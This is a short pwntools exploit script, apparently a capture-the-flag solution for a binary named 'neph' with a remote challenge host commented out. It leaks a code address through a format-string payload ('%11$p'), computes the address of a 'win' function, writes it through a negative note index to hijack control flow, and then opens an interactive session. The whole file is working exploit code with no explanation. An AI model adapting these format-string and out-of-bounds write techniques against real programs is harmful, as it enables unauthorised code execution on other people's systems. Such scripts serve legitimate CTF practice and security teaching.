from pwn import *
import string
context.log_level = "debug"
# p = remote("sisterlab.id", 42006)

# ============== Getting leaks =======================
p = process('./neph')
leaker = b"%11$p"
p.sendlineafter("User input: ",b"1")
p.sendlineafter("Enter note index (0-31): ",b"1")
p.sendlineafter("Enter total spending: ",b"0")
p.sendlineafter("Enter spending note: ",leaker)
p.sendlineafter("User input: ",b"2")
p.sendlineafter("Enter note index (0-31): ",b"1")

leak = p.recvuntil("\n==")
leak = leak[59:-3]
print("leak = ",leak)
leak = int(leak,16)
print("leak = ",hex(leak))
offset = leak - 0x16a1
win = 0x11b9 + offset
print("win = ", hex(win)) 
win = str(win)

p.sendlineafter("User input: ",b"1")
p.sendlineafter("Enter note index (0-31): ",b"-6")
p.sendlineafter("Enter total spending: ",win)
p.sendlineafter("Enter spending note: ", b"anjay mabar")
p.interactive()


